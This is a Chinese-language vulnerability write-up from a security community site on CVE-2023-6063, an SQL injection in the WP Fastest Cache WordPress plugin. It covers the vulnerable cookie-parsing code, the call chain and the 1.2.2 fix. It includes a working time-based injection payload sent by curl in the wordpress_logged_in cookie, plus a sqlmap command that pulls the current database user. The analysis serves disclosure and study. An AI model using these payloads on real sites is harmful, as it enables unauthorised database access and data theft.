

# CVE-2023-6063分析|WordPress WP Fastest Cache 插件导致的SQL注入 - 先知社区

CVE-2023-6063分析|WordPress WP Fastest Cache 插件导致的SQL注入

- - -

### 漏洞环境

● wordpress 版本无限制  
● WP Fastest Cache 插件 <1.2.2，这里使用1.2.1版本  
启用 WP Fastest Cache 插件，并启用“缓存系统”

[![](assets/1702866477-626aa05914ce7ca06b880c04272cb392.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213222532-7917171a-99c3-1.png)

漏洞点  
cache.php 。调用在漏洞分析部分分析

[![](assets/1702866477-bf9f0123830af9522d28140f0533151a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230000-49924762-99c8-1.png)

public function is\_user\_admin(){  
global $wpdb;

```plain
foreach ((array)$_COOKIE as $cookie_key => $cookie_value){
    if(preg_match("/wordpress_logged_in/i", $cookie_key)){
        $username = preg_replace("/^([^\|]+)\|.+/", "$1", $cookie_value);
        break;
    }
}

if(isset($username) && $username){          
    $res = $wpdb->get_var("SELECT `$wpdb->users`.`ID`, `$wpdb->users`.`user_login`, `$wpdb->usermeta`.`meta_key`, `$wpdb->usermeta`.`meta_value` 
                           FROM `$wpdb->users` 
                           INNER JOIN `$wpdb->usermeta` 
                           ON `$wpdb->users`.`user_login` = \"$username\" AND 
                           `$wpdb->usermeta`.`meta_key` LIKE \"%_user_level\" AND 
                           `$wpdb->usermeta`.`meta_value` = \"10\" AND 
                           `$wpdb->users`.`ID` = `$wpdb->usermeta`.user_id ;"
                        );

    return $res;
}

return false;
```

}

### 漏洞复现

记得改cookie 中 wordpress\_logged\_in的字符串，如wordpress\_logged\_in\_5bd7a9c61cda6e66fc921a05bc80ee93  
漏洞点在cookie的 wordpress\_logged\_in\_5bd7a9c61cda6e66fc921a05bc80ee93(会变) 参数处  
curl [https://example.com](https://example.com/) -H "Cookie: wordpress\_logged\_in=1234%22%20AND%20(SELECT%202537%20FROM%20(SELECT(SLEEP(5)))Sazm)%20AND%20%22qzts%22=%22qzts"

sqlmap 证明：  
python sqlmap.py --dbms=mysql -u "[http://your-url/wp-login.php](http://your-url/wp-login.php)" --cookie='wordpress\_logged\_in\_732bf205f063fd120b84d8a0d44e2d5d=\*' --level=2 --current-user

[![](assets/1702866477-5b3a8a10a5cf3ea7ca52c3713a249e29.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230021-564dd444-99c8-1.png)

### 漏洞分析

简单说就是在加载插件时，取wordpress\_logged\_in 第一个 | 前的字符，然后插入到 SQL 语句中。  
而这样也是可以匹配的，即payload

[![](assets/1702866477-1a5f049c04a16ed30321a8acf80e27c8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230031-5c24f21c-99c8-1.png)

[![](assets/1702866477-f808862a038e492e26632509c9ed06e8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230038-609225a4-99c8-1.png)

wordpress\_logged\_in\_5bd7a9c61cda6e66fc921a05bc80ee93内容如下：  
wordpress|1702575454|gquEYSZ8lNbJktLUWLpElq4XybIhpPmOL3MmTMcqi4X|91c52c9d088ad036d8ccdc6ef645adfd906829527d27ea494140369cdbfbb1b9  
这一部分的功能就是取出wordpress

[![](assets/1702866477-167e1be5ecf07b62e55459a854f59743.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230052-68a16188-99c8-1.png)

然后没有过滤就进入了SQL语句中

[![](assets/1702866477-b515e46cd684b2bff1f61e86010caae4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230102-6ea23f8a-99c8-1.png)

is\_user\_admin() 被 createCache() 调用

[![](assets/1702866477-91329269039bd1e5381ed861b67cf030.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230128-7e7f2cba-99c8-1.png)

追踪 createCache()，被cache()调用

[![](assets/1702866477-848cc98c8476f8eea8f4cf7d381d8589.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230142-86752a8c-99c8-1.png)

[![](assets/1702866477-72063633aa3f6595ca1b4afc42bcc6fb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230148-8a0f8bb0-99c8-1.png)

看cache()在何处被调用，发现被构造函数调用，即在 WpFastestCache 对象被创建时调用

[![](assets/1702866477-db6751b777f967bdb09696cdc7ef9ce9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230155-8e1020f8-99c8-1.png)

[![](assets/1702866477-7d1304d0f30f504d0682018531b2cb3e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230201-91a045cc-99c8-1.png)

这两处创建了对象，看谁包含了wpFastestCache.php，继续跟，跟到plugin.php，大概就是插件加载时调用的

[![](assets/1702866477-1d165b8b459d87a615552d88902c0f67.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230220-9ceff04e-99c8-1.png)

[![](assets/1702866477-4e417726c80006baf42550f9124c09b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230225-a0258ecc-99c8-1.png)

[![](assets/1702866477-ed959346df00fcb1d1ab51caf92937cb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230230-a3498df6-99c8-1.png)

### 漏洞修复

WP Fastest Cache 插件 1.2.2，修复了此漏洞

[![](assets/1702866477-46c5ef5b632e29c23bb794e2d0bb6514.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230239-a8b4fe2e-99c8-1.png)

对参数进行了过滤

[![](assets/1702866477-005f6282df003c301fd2d87b68b4dd12.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230250-af523814-99c8-1.png)

[![](assets/1702866477-0311fcc54ddaa3fbabd059933afabbcf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231213230257-b3177f86-99c8-1.png)
